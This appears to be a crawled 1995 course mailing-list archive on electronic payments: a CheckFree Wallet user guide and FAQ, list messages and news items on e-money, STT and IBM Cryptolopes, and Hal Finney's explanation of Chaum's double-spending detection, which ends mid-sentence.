the pull-down menu box beside the card number. If this card type is incorrect, you can select the correct type using the pull down menu. 22. Enter your Customer Identification Number if the credit card is American Express. 23. Enter the Expiration Date and Card Description (such as "John's Business Visa") in the appropriate boxes. The description provides a way to attach unique names to your credit cards. This is especially useful when you are using multiple cards of the same type. In the Billing Address section: 24. Enter your street address, city, state, and zip code. This information must be entered exactly as it appears on your credit card billing statement. 25. For international use, enter your country code. Click the Help button for online help if you do not know the country code. This field defaults to the United States and is optional for purchases made within the United States. 26. Enter your area code and telephone number. 27. Click OK if the information is correct. Click Cancel if you do not want to enter the persona information at this time. If you click Cancel, any information entered in the fields will not be saved. When you click OK, the new persona is encrypted and sent to CheckFree for confirmation. You are now ready to use CheckFree Wallet. Additional credit cards can be added at a later date using the CheckFree Wallet Administration menu. Please read the section at the end of this file for more information on the administration features available through this dialog box. Using CheckFree Wallet ***************************************** Shopping online with CheckFree Wallet is as simple as shopping in a local store or placing catalog orders using your telephone. In fact, shopping remotely on the Internet is more convenient because you can: * Read detailed product descriptions * View full-color screen graphics of the items * Check inventory before you purchase * View multimedia product demonstrations * Read additional product information such as warranties and shipping terms To purchase goods and services with CheckFree Wallet: 1. Log onto the Internet and access the Merchant's Web site where you wish to shop. A list of merchants that accept Wallet transactions can be found at the end of this section. 2. Browse the merchant's pages of product information (all linked for easy navigation) and place items selected for purchase in your "virtual shopping basket." The shopping basket is a running list that tracks the items you mark for purchase. Items in the basket are tallied by unit price, quantity and total purchase price including applicable sales tax and shipping and handling charges so you know exactly how much you are spending. (NOTE: The shopping metaphor used by each merchant, such as the virtual shopping basket, and the information presented may differ from merchant to merchant.) 3. When you have finished shopping, click the Purchase button on the bottom of the Shopping Basket page to pay using CheckFree Wallet. (NOTE: Buttons and wording on shopping pages may differ from merchant to merchant. Click the button that best describes what you want to do.) When you select Purchase, the browser shows the types of payment methods that are accepted by the merchant, and displays an order summary page. You may also have to complete fields in other dialog boxes such as shipping information. During the purchase process, your CheckFree Wallet will automatically be activated and appear on your screen. 4. Enter your CheckFree Wallet password. When the password is entered correctly, CheckFree Wallet accesses the encrypted account information stored on your computer and displays a Request For Payment page with a list of accepted credit cards that are configured in your CheckFree Wallet. (NOTE: If the Merchant does not accept a card that you have in your Wallet, that card is disabled and is not available for use.) 5. Select the credit card you wish to from the cards available in the list. When you click on the credit card name, the account information you loaded previously is encrypted and passed to the Merchant. >From this point, the Merchant completes the purchase transaction. The payment request is sent to CheckFree for authorization and funds transfer (settlement). Like credit card purchases made in a traditional store, an authorization response is returned immediately to the merchant who then begins the process to ship the goods you purchased. A final dialog box appears on your Web browser indicating successful credit card payment and giving a purchase and payment summary. A Sample Shopping Adventure ************************************ Lets look at a sample shopping adventure at WebThreads, a fictitious merchant on the Web. 1. Chris wants some new clothes and is anxious to shop on the Internet at WebThreads. 2. WebThreads' home page is filled with a variety of eye- catching graphics that present basic information such as payment methods accepted, contact information, and hyperlinks to specific shopping pages. Chris clicks on the Special Sales and Offers message to browse the shopping pages. This page lists and briefly describes the sweater styles that are on sale. A photograph of each style gives Chris a good idea of what each style actually looks like. 3. Chris likes the Wool Cable sweater, and clicks on it to display another page with specific information pertaining only to this sweater. On this page, Chris sees a larger, more detailed photograph of the sweater with a detailed description and ordering information. Also on this page are links to the Shopping Basket, and additional shopping pages. 4. The blue sweater looks perfect, but the red one may be nice too. Chris clicks on Red in the color list to view the sweater in red. Too bright! The blue one is best after all. 5. Next Chris completes the Quantity field, then clicks the Add to Shopping Basket button to add the item to the list of items to purchase. The Shopping Basket page is automatically displayed showing all of the items selected so far including unit cost, quantity, and basket totals. (Chris could have clicked the Continue Shopping at WebThreads button without adding the sweater to the list if desired.) 6. Chris is done shopping for now and clicks the Purchase Items in Your Basket button to make the purchase. Chris completes the fields of the Shipping Address dialog box, then the payment page appears displaying the CheckFree Wallet password dialog box. 7. Chris enters a password that gives access to CheckFree Wallet. In Chris' Wallet, the American Express is disabled because WebThreads does not accept that form of payment. (Good thing Chris didn't need to leave home!) 8. Chris selects Visa. All of the account information is encrypted and passed to WebThreads for processing and order fulfillment. A final dialog box appears indicating successful credit card payment and gives a purchase and payment summary. Chris has purchased the sweater.

Fees for the CheckFree Wallet credit card service are paid by merchants as part of their standard credit card transaction costs. Q. What's the difference between CheckFree Wallet with CyberCash, CompuServe Wallet with CheckFree, and CyberCash Wallet? A. To the consumer, there is no difference. All of these Wallets are completely compatible and can be used for payment at any merchant that accepts a Wallet. As CheckFree technology is incorporated into other Internet applications you may see more co-branded wallets. Don't worry, your CheckFree Wallet will always be accepted by on-line merchants! Q. Is CheckFree Wallet secure? A. Yes, CheckFree Wallet is extremely secure. All of your sensitive credit card information is protected by secure encryption technology licensed from RSA Data Security, Inc. Your credit card information is protected by a 768-bit, dual- key encryption system. The information is encrypted both on your computer and during transmission. Q. Can "hackers" on the Internet get and use my credit card number? A. No. Your credit card information resides only on your computer and all data is encrypted both on your computer and before it is transmitted on the Internet. Q. I already use a secure web browser, why do I need CheckFree Wallet? A. First, CheckFree Wallet is completely compatible with all of the secure web browsers and servers currently on the market. Since CheckFree Wallet only encrypts financial information, it can use the strongest available encryption technology and still be exportable. CheckFree Wallet is a more secure and convenient method of Internet commerce for both consumers and merchants. Q. What merchants use CheckFree Wallet? How can I find out who uses CheckFree Wallet? A. More and more merchants are using CheckFree Wallet because their customers appreciate the ease and security of commerce on the Internet. A complete list of Wallet-associated merchants can be obtained on the CheckFree Web site (http://www.checkfree.com). Q. I shop at local stores and through printed catalogs, why do I need to shop on-line? A. Think of the World Wide Web as the world's largest store, open 24 hours a day, 365 days a year. You have the ability to shop at your convenience and can visit as many or as few places as you like. Stores and merchandise, unavailable locally, are readily available on the Internet. You don't have to fill out lengthy order forms and you never have to wait on the phone for the next available operator. Q. What if I want to return a purchase or am not satisfied with the merchandise I purchase online? A. Your online purchases are identical to those made at a local store or over the telephone. Return policies are established by the merchant and are not changed by the method of payment. All returns and problems should be handled directly through the merchant. Also, when a purchase is made with a credit card there may be extended solutions available to consumers. Q. What is a persona and why is it used in a payment? A. The persona is a representation of the consumer when payments are made on the Internet. The persona name can be your name or other highly identifying group of characters (e.g. JeffSmith, BigBadWolf, etc.) Using a persona, consumers are given a high degree of privacy in payment transactions. This privacy is balanced by the merchant's need for authentication and anti-tampering in a payment service. Q. What is credit card linking? A. When you prepare CheckFree Wallet software for use, you must associate information from the credit cards you intend to use when you shop. Information such as the credit card number, expiration date, name, and address is encrypted and stored on your computer until you are ready to make a purchase and transmit the payment information to the merchant. Q. Does CheckFree or the online merchant keep track of my credit card numbers? A. Absolutely not! Your credit card information is encrypted and stored only on your computer. Every time you make a purchase, the information is encrypted and transmitted through the merchant to CheckFree. This information is used only for authorization and settlement of the credit card transaction and is not stored for any future use. Unlike other Internet commerce systems that keep your credit card information in a database, CheckFree Wallet links all sensitive information to your persona. You are the only one who stores that information. Q. How does the payment process work? A. To the consumer it's not important to completely understand the payment process. But, since you are paying with a credit card the process is similar to that which occurs when you shop at a local store or over the telephone. At your request, encrypted payment instructions are sent to the merchant. The merchant adds their version of the payment instructions to the still-encrypted information and digitally "signs" the packet of information. CheckFree receives the encrypted information and decrypts everything. To guard against fraud, CheckFree compares the consumer's version of the payment instructions to merchant's version. If everything matches, an authorization request is sent to the appropriate credit card network. CheckFree receives an authorization or decline code from the credit card network and forwards this response to the merchant. After authorization, the appropriate funds are debited from the consumer's credit card account and credited to the merchant's account. Q. Can I use CheckFree Wallet on other platforms? A. Currently CheckFree Wallet is available only for Microsoft Windows 3.1. The software has been successfully used on OS/2, Windows 95, and Windows NT machines but no support is currently being provided for these platforms. Future releases of CheckFree Wallet will be available for other platforms including the Macintosh OS. Q. Is CheckFree Wallet based on an open standard? A. Yes, CheckFree Wallet is based on an open standard. This means that other companies can add features or services based upon CheckFree Wallet technology and that the technology will be adopted and used by a wide range of merchants. The protocol behind this open standard is described in the Internet draft CyberCash Credit Card Protocol dated 7/8/95 (ftp://ds.internic.net/internet-drafts/draft-eastlake- cybercash-v08.txt.) Q. Is CheckFree Wallet exportable? A. Yes, CheckFree Wallet -- including the secure encryption system -- has been approved for export by the US government. The US government limits export of encryption technology to small keys only for bulk encryption applications. In bulk encryption, the system encrypts all information that is passed between two computer systems. Since CheckFree Wallet encrypts only the credit card information, the US government allows export of the larger, 768-bit, key. Q. Which World Wide Web browsers have been tested for use with CheckFree Wallet? A. The following Web browsers have been tested and validated for this version of CheckFree Wallet (other browsers not included in this list may also work): FTP & Spyglass Enhanced NCSA Mosaic Version 1.15.111.0 FTP & Spyglass Enhanced NCSA Mosaic Version 2.0 Internet In A Box - Spry AirMosaic Version 03.0A.01.04 InternetWorks Version 1.0.3 Mosaic In A Box - Spry AirMosaic Version 04.00.08.08 NCSA Mosaic Version 2.0.0b4 Netscape Navigator Versions 1.1b3, 1.1, and 1.2 O'Rielly And Associates Enhanced NCSA Mosaic Release 1 QuarterDeck Mosaic Prerelease 4 Q. Which TCP/IP communications stacks have been tested for use with CheckFree Wallet? A.

Common Problems and Solutions ********************************** Problem: The browser did not download CheckFree Wallet software. Solution: Check the browser/communication parameters and be sure the software is configured to download. This parameter is often found under the Preferences menu. Problem: CheckFree Wallet files are lost on my computer. Solution: The browser may have downloaded the files to a default location that you are unaware of. Use Windows' "Find" command to locate the files. Search for the file name WINCYBER.EXE. Be sure to start the search from the root directory (C:\) and include all directories and subdirectories in the search. If you have run the self-extracting archive routine (WINCYBER.EXE) and cannot find the extracted files, you can also use the Windows' "Find" command to locate the files. Search for the file name CFWALLET.*. Be sure to start the search from the root directory (C:\) and include all directories and subdirectories in the search. Problem: The download process began successfully but did not finish completely. Solution: CheckFree Wallet software is approximately 600K in size and takes approximately 6 to 8 minutes to download using a 14.4 modem. Some modems work faster than others, and some browsers do not indicate when a download is in progress. Do not give up too soon or you might interrupt the download process. Problem: CheckFree Wallet software is not available for use when I am on the Web. Solution: Be sure your Internet "complete package" has WINSOCK connection capabilities to the Internet. If a WINSOCK connection is not supported, you cannot use CheckFree Wallet at this time. Problem: CheckFree Wallet software is not available for use through my Web browser. Solution: Most commercial and shareware Web browsers are supported by CheckFree Wallet. If you would like to try an unsupported browser, you may setup CheckFree Wallet as a viewer/helper application yourself. Each browser has a different method to do this, but the following information is essential: File Type: application Mime Type: x-cybercash Suffix: .cym Application: cyber.exe (This file is in the directory specified during the setup process.) NOTE: CheckFree Wallet will not work with Web browsers that contain their own TCP/IP stack. Support for these browsers may be included in future releases. Problem: I cannot get past the call for Proxy information to use CheckFree Wallet. Solution: Some organizations set up a "firewall" to keep unauthorized users out of their systems. If you are facing a firewall, you must have an HTTP proxy for CheckFree Wallet to work. You can enter the proxy you are using through the Software Options selection from the CheckFree Wallet Administration dialog box. When the correct proxy information is entered and saved, you should have no further trouble getting past the firewall. Online help may also be available by clicking the Help button on the bottom of most CheckFree Wallet dialog boxes. **************************************************************** Copyright (c) 1995 Checkfree Corporation.

I've learn about it from some reporting I've been doing on it.. 1) Has there been any public review of this product? Here is the basic run down It uses a 768-bit key. They claim it is not escrow-ed with the US government. It is export able to most countries except for Sudan, Cuba, North Korea, Syria, Libya, Iraq ot Iran. It encrypts limited bits of information (like Credit Card Numbers) which is why they claim it was able to get export approval. User configures the Wallet(tm) by downloading and installing and configuring it. It works with Proxy servers which I have successfully tested. It generates a public and private key pair using RSA technology. It keeps the payer anonymous to the merchant via the internet. Merchants can learn the payer's name out of band (e.g., by phone). No credit card info is stored on a merchant's site. Payment is encrypted and signed buy the payer and sent to the merchant who add's there version of the transaction and their signature. It is forwarded to check free who then decrypt, compare the payers' and merchant's view of the transaction and if they agree process it. It use is very very quick and easy. It auto configures itself to Netscape. Payment information is sent to the Wallet (TM) from the merchant in a Mime segment, which triggers a launch of the Wallet, the payer binds in their credit card data (all ready at Checkfree (at installation) e.g., which card to use. Then the whole thing is sent to the merchant then the onto Checkfree for processing as indicated above. I was very impressed with the software and it's easy of use. Currently only works on Windows but soon on the Mac.. /hawk -- Harry Hawk Manager of Interactive Communications Warwick Baker & Fiore 212 941 4438 habs@warwick.com Next message: Dave Farber: "cybercash" Previous message: Vinod Valloppillil: "EMU_boo (fwd)"WT02-B11-138IA087-000625-B033-190http://res2.resnet.upenn.edu:80/hypermail/cis899/0142.html 130.91.195.242 19970122042251 text/html 1886HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:22:52 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 1715Last-modified: Tue, 05 Dec 1995 06:51:03 GMT Daily Chat on CIS899: IP: 2nd International Cryptogrpahy Experiment (ICE) [worth IP: 2nd International Cryptogrpahy Experiment (ICE) [worth Dave Farber (farber@central.cis.upenn.edu) Sat, 4 Nov 1995 09:28:31 -0500 Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Dave Farber: "IP: Sixth Conference on Computers, Freedom, and Privacy" Previous message: Dave Farber: "IP: Gates: Jiffy Iffy Crypto"Summary of the the 2nd International Cryptogrpahy Experiment (ICE) Workshop, Shape Technical Centre, The Hague, Sept.18-19, 1995 http://www.tis.com/crypto/ice/summary.html ------------------------------------------------------------------------------ Next message: Dave Farber: "IP: Sixth Conference on Computers, Freedom, and Privacy" Previous message: Dave Farber: "IP: Gates: Jiffy Iffy Crypto"WT02-B11-139IA087-000625-B033-218http://res2.resnet.upenn.edu:80/hypermail/cis899/0123.html 130.91.195.242 19970122042313 text/html 7945HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:23:01 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 7774Last-modified: Sun, 05 Nov 1995 18:10:03 GMT Daily Chat on CIS899: EMU_boo (fwd) EMU_boo (fwd) Vinod Valloppillil (vvallopp@eniac.seas.upenn.edu) Fri, 3 Nov 1995 14:34:21 -0500 (EST) Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Dave Farber: "Public Reviews of CheckFree Wallet system?"

Electronic money in a race with Emu With e-money, users would find it easy and cheap to hold funds in several currencies By Giles Keating, head of global economics at CS First Boston in London Economic and monetary union or electronic money? Recent suggestions that the start of Emu might be delayed beyond 1999 raise the intriguing possibility that a viable international electronic money will be available before the European single currency. Indeed, the former could make the latter redundant. The new generation of electronic money, now being tested, offers many features that address the problems faced by cross-border travellers in Europe. Users would carry a plastic card that would let them download funds from their bank account using a mobile phone or cashpoint, or at a post office. The card could then be used to make purchases up to the value of the sum downloaded. Because the cost of foreign exchange transactions under such a system would be so low, users would find it easy and cheap to hold funds in several currencies. Credit cards already offer a form of multi-currency payment. But they are costly, with unfavourable exchange rates and high charges to retailers, and they are uneconomic for small transactions such as bus fares. Nor can they be used for person-to-person transfers, as with electronic money, or e-money. Credit cards are also available only to people with a record of stable financial affairs, whereas electronic money is pre-paid - you cannot spend what you do not have and available to all. From the perspective of the single currency, there is a greater difference between credit cards and electronic money. With a credit card, the retailer receives local currency, the card holder pays the bill in his or her home currency, and the card provider makes the currency exchange. With electronic money, cardholders and retailers would choose which currency to hold and to conduct the transaction in. With e-money, it would become natural to hold an appreciating foreign currency for transactions at home and abroad. In short, e-money offers true "currency competition". Unleashed on Europe's present babel of currencies, the effect could be dramatic. Smaller currencies could almost disappear -- especially if there is any hint of systematic depreciation. Even larger currencies would face a substantial decline in usage if they were weak. With private-sector transactions voluntarily taking place in strong foreign currencies, weaker currencies would progressively be reduced to being used for a residual lump of "legal tender" transactions, such as tax payments. Long-term credibility as a strong currency would become even more important than at present. This is because the use of interest rates to prevent depreciation would be blunted by the new mobility of large amounts of money, in non-interest bearing accounts, kept for making electronic transactions. Depending on your perspective, this would be either disaster or nirvana. Disaster, because governments and central banks in countries with weak currencies would lose the seignorage that currency issue brings, and the sovereignty it is supposed to provide (but may not). Disaster, because it would destroy two central aims of Emu: the sharing of power between monetary authorities, and the attempted imposition of currency soundness by institutional fiat. Nirvana, because it would provide people with a powerful protection against the random and hidden taxation imposed on them when governments inflate, and because it would create monetary soundness via market forces. Will it happen? Governments may try to slow it by discouraging retailers from accepting electronic payments in foreign currencies. But it would be hard to prevent. With e-money the costs both of currency exchange and of obtaining "cash" from the bank would be low, and access immediate. So users would not need to keep on their card the normal small balance to tide them over in the event of something unexpected. Although the promoters of e-money emphasise that their medium would be a vehicle for the single currency rather than a rival, the race is on. If the present timetable for the single currency -- of 1999 plus three and a half years' transition -- is adhered to, it may materialise before e-money becomes established. However, if there is a significant delay, e-money may make the whole Emu project an obscure anachronism. Yet if the single currency did win the race, any small or medium-sized economy that stayed outside it would need to beware. Its currency would need to be seen as strong, otherwise it would find almost all its transactions taking place in electronic single currency.

Following are my answers 1. STT is a secure protocol. There are now only prototype products. We plan to test early implementation of the protocols early next year. We hope there will be production products by mid 1996. 2. I believe you can look at the cryptogrphy used in STT. You see that we have even specified how to generate random numbers. Of course, after the specification is implemented, there will more opportunity to see the "entire process". 3. Why do you think there should be more than one root key? I expect that there will be others who develop root keys, but we see no need for that if the root key is managed securely. 4. I will have to talk to our technical people regarding the processing time for a 2k key. I do believe that there was analysis done that took into account the tradeoffs between size and performance, but will have to check.

IBM signed up 29 information and technology providers for the service, called the IBM infoMarket, including the Associated Press, States News Service, and ESPN Sports Ticker. At the same time, a small, privately-held company, Electronic Publishing Resources Inc., based in Sunnyvale, Calif., also unveiled an electronic rights system, called NetTrust, to protect the rights of content creators, developers and distributors. Both companies unveiled their products at the Internet World conference in Boston on Tuesday. Publishers are worried that Internet users will be able to access their material, download it, print it out and then distribute it without paying any fees to the owners of the copyrighted material. ``Rights management and security have been two inhibitors to electronic commerce,'' said Sam Albert, a Scarsdale, N.Y.-based consultant. He said that IBM's clout and commitment to the Internet could induce other publishers to join IBM. Both IBM's service and the NetTrust system work by putting material, such as articles or other copyrighted information, in a sealed ``container'' at a World Wide Web site, a portion of the Internet. Users could browse but not access the material in its entirety without paying a fee. On IBM's system, a user receives a private, electronic key, to unlock the package in its sealed container and then it can be be downloaded, printed or read. On Electronic Publishing's NetTrust, a user accesses a ``DigiBox'' protecting the content. Once the material is accessed by the user, they will have to pay a fee that is then passed on to the publisher. An IBM spokesman said the company has not yet announced any pricing structure for its service, which is expected to be available in the first quarter of 1996. ``I'm not sure how the market is playing out,'' said Jerry Michalski, an editor at the Release 1.0 newsletter. ``There is a gaping hole in the marketplace to comply with copyright law. There is a clear, clear need for someone to do this right.'' IBM, Electronic Publishing, another small company called Wave Systems Corp. in New York and others are all hoping to cash in on protecting the rights of publishers of the growing volumes of information published on the Internet, now available for free. As part of its announcement, IBM also unveiled a technology called Cryptolopes, which will enable owners of copyrighted information to securely distribute it and receive payment for its use over the Internet. IBM also set up a clearinghouse to assist the content providers in managing content access and payment processing. Other content providers include I/B/E/S International Inc., which tracks financial data and Wall Street analysts' estimates of company earnings, and legal publishers West Publishing Inc.

The main idea is that each piece of cash carries some <info> belonging to the person who originally withdrew it. Now, A being the original withdrawer, if A double-spends the cash (say x^d) to both B and C then combining the information that B and C got from the cash itself (at the time B and C both sent this info to the bank) reveals out the <info> that was embedded in the cash. Since this <info> belongs to A, who is the double-spender, you've identified the true person. Now, consider the case that A spent x^d to B. Remeber that B cannot play with the contents of x since it's signed by the bank. Thus, if B wants to spend x he will spend it exactly as it is, B has no way of putting his own <info> into x. Furthermore, B wouldn't like to put his <info> into x even if he could if he has the intention of double-spending it. Consider B double-spent x to C and D. Then C and D extracted their parts of information embedded in x and sent to the bank. Now, the bank can reveal out the <info> which belongs to the original withdrawer of x, namely A, but A is not the double-spender. Thus, B got away with the much that he bought upto the time bank detected the double-spending, and still he didn't face any serious problems that would jeopardize his anonimity. There should be more behind the mechanism told in the paper that I got this information from. Otherwise, there is no off-line anonymous e-money. I would like to hear your comments about this problem, or any extra information that could help us convince ourselves, atleast technically, that one piece of ecash can be spent over and over again without the need to deposit each piece of cash that we receive, and get brand-new ones with new serial numbers. osman nuri ertugay Next message: Dave Farber: "Re: newsweek oct 30 Levy digital cash article" Previous message: Osman Nuri Ertugay: "Detecting Double-Spending by Hal Finney"WT02-B11-150IA087-000625-B034-62http://res2.resnet.upenn.edu:80/hypermail/cis899/0112.html 130.91.195.242 19970122042540 text/html 16776HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:25:40 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 16604Last-modified: Thu, 26 Oct 1995 19:48:29 GMT Daily Chat on CIS899: Detecting Double-Spending by Hal Finney Detecting Double-Spending by Hal Finney Osman Nuri Ertugay (ertugay@gradient.cis.upenn.edu) Thu, 26 Oct 1995 15:15:36 -0400 Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Osman Nuri Ertugay: "problem: tru double-spender not revealed" Previous message: Jim S Gaw: "Re: Digicash Presentation homeapge"Detecting Double-Spending 15 Oct 93 Revised 13 Jun 95 Here is an attempt to describe Chaum's digital cash from his paper, Untraceable Electronic Cash, by Chaum, Fiat, and Naor, from the Crypto 88 proceedings. This cash has the property that the user of the cash can remain anonymous so long as she does not spend it more than once, but if she does double-spend then her identity is revealed. This is how it works in general terms: Alice opens an account with a bank non-anonymously. She shows ID so that the bank knows who she is; both she and the bank know her account number. When she withdraws cash, she goes to the bank or contacts them electronically and presents some proof of who she is and what her account number is, and the bank gives her some digital cash. The digital cash is an information pattern, perhaps stored in a computer file on a smart card or magnetic disk. Later, she spends the digital cash by sending or giving it to Bob, a merchant. Bob can check and verify that the cash must have come from the bank. He accepts the cash if it is valid, giving Alice the merchandise. Later, he sends the cash to the bank to be added to his own account. Note that this much could basically be done with a simple RSA signature. The bank could give Alice a statement saying, "this is worth $1", signed by the bank's public key. Bob could verify that the statement was in fact signed by the bank, and know therefore that no one else than the bank could have created that statement. He accepts it and sends it to the bank, which honors it since it recognizes its own signature. One problem with this trivial money is that double-spending can not be detected or prevented since all the cash looks alike. This can be remedied by having the cash include a unique serial number. Now when Bob goes to accept the cash from Alice, he can call the bank and say, has anyone else deposited serial number 123456? If not, he accepts the cash and deposits it. This is called on-line electronic money; the merchant must check with the bank for each transaction. This improved simple system does not deserve to be called cash, though, because it lacks the distinguishing characteristic of digital cash: it is not anonymous. When the bank sees money with serial number 123456 being deposited, the bank recognizes that this was the same bill that Alice withdrew. The bank can therefore deduce that Alice spent the money at Bob's, and from this kind of information a dossier could be built up with all kinds of privacy-destroying information about her. To allow anonymity, we have to get into the mathematics. What we want is for Alice and the bank collectively to create an RSA signature from the bank that could not be forged, but one which the bank will not recognize as coming from Alice. This is the first thing Chaum's paper discusses. The money in this system is of the form (x, f(x)^(1/3)) mod n, where n is the bank's public modulus. f() (and, below, g()) is a one-way function, one which can be calculated easily but for which it is infeasible to calculate the inverse. It should also be infeasible to come up with two different y,z such that f(y) = f(z). Today there are several suitable choices for one-way functions, the most common being the MD4 and MD5 algorithms from RSA. The reason the expression above would be accepted as cash is two-fold. First, only the bank can calculate anything ^ (1/3) mod n. This is basically the RSA signing operation for the exponent of 3. Nobody else can find cube roots. The reason f(x) is used is this. Suppose we proposed that (x, x^(1/3)) should be the cash, for some random x, reasoning that only the bank could find the cube root of x. Can you see how to forge cash like this? (Take a few moments and try to see how you could construct a pair like this even if you can't take cube roots.) The answer is that it is easy to forge this by first choosing a random y, and exhibiting the pair (y^3, y). Now we have a number and then its cube root. Yet we didn't have to take any cube roots to find it. That's why this kind of money would be no good. Chaum's system avoids this by taking the cube root of a one-way function of x. To forge it without taking a cube root you'd have to produce (finv(y^3), y), which would match the above pattern, but you can't invert the one-way function like that. So only the bank can create money of the proper form. This can be thought of as the formal, mathematical form of my informal "money" above which was a digitally signed note with a serial number. Here, x is the serial number, and it's digitally signed in this special way. Nothing more is needed. The nice thing about this money is that it allows for blinding, a method of having the bank sign the value without knowing what value it is signing. It works like this. Alice chooses x, which will be the x in the cash. She calculates f(x), but instead of sending it to the bank to be signed (raised to the 1/3 power) she first chooses a random number r, and sends f(x)*r^3 to the bank. The bank takes this number to the 1/3 power, getting r * f(x)^(1/3). Remember, though, that the bank doesn't see r or f(x) separately, but just their product. It doesn't know what r or f(x) is. They could each be anything, actually. The bank sends this r * f(x)^(1/3) back to Alice, and she divides it by r, which she knows. This gives her f(x)^(1/3), and she puts that together with x to get her digital cash: (x, f(x)^(1/3)). She has a piece of money which could only have been signed by the bank, yet the bank won't recognize it when it is deposited. Other, non-mathematical, things take place as this withdrawal goes on. Alice must prove her identity to the bank, as mentioned above. And the bank will debit her account by the value of the cash. In this system, we are assuming for simplicity that all cash has the same value. In a real system, different values might be encoded by different exponents than 3. When Alice deposits the money, Bob must call the bank to make sure that it hasn't been deposited before, this being an "on-line" system. Although the bank won't recognize x (it's never heard of it) it will remember all the x's which have been deposited and so can alert Bob if the money has been spent before. Both Bob and the bank can verify the digital signature on the money and so will honor it. All the material above takes up less than one page of Chaum's nine-page paper. For Chaum, this much is trivial. Now we get to the interesting part. Now we will see the scheme that allows double-spenders to lose their anonymity. This will allow for "off-line" electronic cash; Bob will no longer have to check with the bank to see if the money has already been spent. He accepts it from Alice knowing that if she does cheat, the bank will honor the cash and sue Alice to make up the loss. (To make this explanation easier to follow, I will describe a slightly simplified version of Chaum's off-line cash. The version I describe requires the use of a non-invertable one-way function as in the f() used above. Chaum's version does not require as strong an assumption and provides "unconditional" untraceability even if the one-way function is broken.) Let's start with the form of the cash itself. It is the product of k/2 numbers, where k is a "security parameter" that affects the chance of a cheater succeeding. Each number is of the form g(xi,yi)^(1/3), where g is a two-argument one-way function similar to the f above. (The "xi", "yi", "ai", etc. here are separate values for each i from 0 to k/2.) xi and yi are like this: xi = f(ai), where ai is a random number, and f is another one-way function. yi is kind of complicated. It is f(ai xor < info> ), where < info> , the key to this whole operation, is identifying information about Alice's account! It is her account number concatenated with a serial number for the cash. Now, why go through all this? Here's why. If you could find out both ai and (ai xor < info> ), for some i, you would know Alice's identity. (Xor'ing them would produce < info> .) When Alice double-spends, both ai and ai xor < info> will be revealed. What happens when Alice spends the coin is this. For each i from 0 to k/2 Bob chooses 0 or 1 at random. If he chooses 1 he gets told ai and yi. If he chooses 0 he gets told (ai xor < info> ) and xi. This will let him check the signature on the money, as described in more detail below. Notice that when Bob gets this information, he'll know a bunch of ai's, and he'll know a bunch of (ai xor < info> )'s, but they are for different i's. He doesn't know both ai and (ai xor < info> ) for any one i. So he can't break Alice's anonymity. When Bob deposits the money at the bank, he passes along the information he got from Alice regarding the ai's and such. Now, suppose Alice cheats. She spends the money again somewhere else, at Charlie's. Charlie goes through the same procedure as Bob, choosing 0 or 1 at random for each value of i. Here is the catch. Since he is choosing at random, it would be very unlikely that he will choose exactly the same 0's and 1's that Bob chose. (Here is where the size of k matters - making it bigger makes it less likely that Charlie and Bob will choose the same pattern of 0's and 1's. But it makes the calculations take longer.) That means for one or more values of i, Charlie will probably choose a 0 where Bob chose a 1, or vice versa. Because of this, if Bob got ai for that i, Charlie will get ai xor < info> . Or if Bob got ai xor < info> , Charlie will get ai. Either way, when Charlie sends his record of this information to the bank, the bank will put Bob's and Charlie's information together and get both ai and ai xor < info> . Xor'ing these together reveals < info> , and Alice is caught! This is the main idea. (Chaum suggests not just relying on random chance to make sure Bob and Charlie use different sets of 1's and 0's. At least some of the bits might be assigned to Bob and Charlie by the bank in such a way that everybody gets a different number. This way it would be guaranteed that Bob and Charlie would choose opposite values for some i.) The reason for the money to have the form it does is so that Bob can check that it is signed by the bank. For each value of i Alice has to give him enough information to calculate xi and yi. If Bob choses a 1, she gives him ai and yi. Given ai Bob can calculate xi (=f(ai)), and with this and yi he can calculate g(xi,yi). If Bob chooses a 0, she gives him (ai xor < info> ), as described before, and also xi. Given (ai xor < info> ), Bob calculates yi (=f(ai xor < info> )), and with this and xi he can calculate g(xi,yi). So for each i, whether Bob gives a 0 or a 1 he gets enough information to calculate g(xi,yi). He multiplies these all together and confirms that they are equal to Alice's original "money" value when it is taken to the 3rd power (recall the money was product of g(xi,yi)^(1/3) for all i). Only the bank could have produced a signature on this one-way function f whose arguments take this special form. One more complication exists. (Well, actually, an almost infinite number of complications exist if you look hard enough. But we'll just focus on one more.) Alice needs to get this special form of money from the bank in such a way that the bank won't recognize it. That means she has to blind it. But in this case the bank wants to be sure that the money is of the proper form when it signs it; in particular, it wants to make darned sure that Alice's < info> which is buried deep in all of those f's of g's is actually the right one for her. But since the bank can't see what it is signing, this is hard to do. Chaum uses cut-and-choose for this. He has Alice prepare all these f's and g's according to the form above, carefully embedding her own incriminating < info> in each one. Then she multiplies each g(xi,yi) by a blinding factor ri^3 just like in the first cash. These are what she sends to the bank to be signed. The trick, though, is that she sends twice as many as will be used. She sends k of them, but only k/2 will be used. (That's why the loop above used k/2 as the limit.) The bank chooses k/2 at random out of the k she sent as the ones which will actually be used. Alice then has to send the blinding ri values for the ones which the bank didn't pick. The idea is that if Alice tries to cheat, embedding "Bozo" instead of "Alice" in that < info> field, she's taking a chance. First, to be useful, she's going to have to embed it in a lot of < info> fields for different values of i. When Bob and Charlie compare notes after she double-spends, every value of i for which they chose different 0's and 1's, which will be on the average half of them, will reveal an < info> field. If she only fakes a few, chances are her real identity will still be revealed. But if she falsifies a great many of them, then when the bank chooses half, chances are at least some of the fake ones will be in the set the bank didn't choose. Then when Alice has to reveal her blinding r's, the jig will be up. The bank will un-blind all those g(xi,yi)'s which aren't being used, and see the fake < info> fields. This cut-and-choose methodology has the disadvantage that Alice has to do twice as much work in preparing the money, half of which will just be thrown away. But it is a simple, "brute force" way to make sure that blinding signatures are actually being done on properly-formed data. So, there you have it. Anonymity as long as you don't cheat, and double-spenders get caught. It's a little complicated but that's what computers are for; Bob and Alice wouldn't do all this stuff by hand. Alice would push the "generate a money candidate" button and get something to be sent to the bank (lots of the new PDA's have infrared wireless communications that would be perfect for face-to-face transactions). Bob would push the "check money" button when Alice spent it and it would flash red or green. As long as the calculations don't actually take too much time, which 